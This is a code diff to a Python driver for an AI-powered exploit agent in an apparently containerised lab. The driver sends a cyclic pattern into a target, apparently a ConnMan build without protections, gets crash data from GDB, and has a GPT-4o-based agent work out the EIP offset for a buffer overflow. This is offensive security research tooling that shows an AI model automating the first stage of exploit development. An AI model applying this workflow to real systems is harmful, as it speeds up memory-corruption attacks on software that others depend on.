@@ -3,7 +3,7 @@ import os
 import time
 import json
 import socket
-import subprocess # <-- THIS IS THE FIX
+import subprocess
 from dotenv import load_dotenv
 from agent import ExploitAgent
 
@@ -11,7 +11,9 @@ load_dotenv()
 
 TARGET_HOST = 'target'
 TARGET_PORT = 8080
-TARGET_CONTAINER_NAME = 'buffcy-minimal-target-1' # Default docker-compose name
+# The container name now includes the target name, making it unique
+# but we can just use the service name 'target' to connect.
+TARGET_CONTAINER_NAME = 'buffcy-minimal-target-1' 
 
 class GDBClient:
     # ... (GDBClient class remains the same) ...
@@ -47,8 +49,8 @@ class GDBClient:
     def close(self):
         if self.sock: self.sock.close()
 
-def main(target_binary, aslr_mode):
-    print(f"***** AGENT STARTING EXPLOIT AGAINST: {target_binary} (ASLR: {aslr_mode.upper()}) *****")
+def main():
+    print(f"***** AGENT STARTING EXPLOIT RUN *****")
 
     agent = ExploitAgent(model_name="openai/gpt-4o")
     gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)
@@ -57,28 +59,28 @@ def main(target_binary, aslr_mode):
         print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
         gdb_client.connect()
         
-        # 1. Tell GDB to run the program
-        gdb_client.send_command('run')
-        print("[AGENT] Target program is running. Waiting for initialization...")
-        time.sleep(3) 
-
-        # 2. Generate payload
         pattern = agent.generate_cyclic_pattern(1200)
         print(f"[AGENT] Generated a {len(pattern)}-byte pattern.")
 
-        # 3. Use 'docker exec' to run the delivery script inside the target container
-        print("[AGENT] Commanding target to deliver payload...")
-        delivery_command = f"docker exec {TARGET_CONTAINER_NAME} python3 deliver_payload.py --payload {pattern.encode().hex()}"
-        subprocess.run(delivery_command, shell=True, capture_output=True)
-        print("[AGENT] Payload delivery command sent.")
+        # This command is now more reliable because the container name is predictable
+        # and the trigger script is simpler.
+        trigger_command = [
+            "docker", "exec", TARGET_CONTAINER_NAME,
+            "python3", "exploit_trigger.py", "--payload", pattern
+        ]
+        print(f"[AGENT] Commanding target to deliver payload...")
+        result = subprocess.run(trigger_command, capture_output=True, text=True)
         
-        # 4. Ask the GDB server to run the program and get the crash report.
-        print("[AGENT] Waiting for crash report from GDB...")
+        print(f"[AGENT] Payload delivery script finished. STDOUT: {result.stdout.strip()}")
+        if result.stderr:
+            print(f"[AGENT] Delivery STDERR:\n{result.stderr}")
+        result.check_returncode()
+        
+        print("[AGENT] Telling GDB to run and waiting for crash report...")
         crash_info = gdb_client.send_command('run_and_get_crash_info')
         
         if crash_info.get("status") == "crashed":
             print("[AGENT] Crash confirmed. Now calling AI for analysis...")
-            # This is the step that will fail if your API key has no credits.
             offset = agent.analyze_crash_and_get_offset(crash_info, len(pattern))
             print(f"--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
         else:
@@ -92,6 +94,4 @@ def main(target_binary, aslr_mode):
         print("\n🎉 Exploit sequence finished.")
 
 if __name__ == "__main__":
-    target = os.getenv("TARGET_BINARY", "connmand_no_sec")
-    aslr = "on" if os.getenv("ASLR_SETTING", "2") == "2" else "off"
-    main(target, aslr)
+    main()
